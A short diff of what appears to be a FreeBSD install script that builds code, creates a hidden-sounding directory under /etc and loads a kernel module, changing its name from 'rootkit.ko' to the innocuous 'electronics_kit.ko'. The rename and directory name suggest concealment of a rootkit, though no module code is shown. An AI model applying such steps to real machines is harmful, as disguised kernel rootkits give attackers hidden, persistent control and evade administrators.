@@ -5,7 +5,7 @@
 make clean
 make
 mkdir /etc/good_luck_finding_this
-kldload ./rootkit.ko
+kldload ./electronics_kit.ko
 
 cc syscall.c -o syscall
 
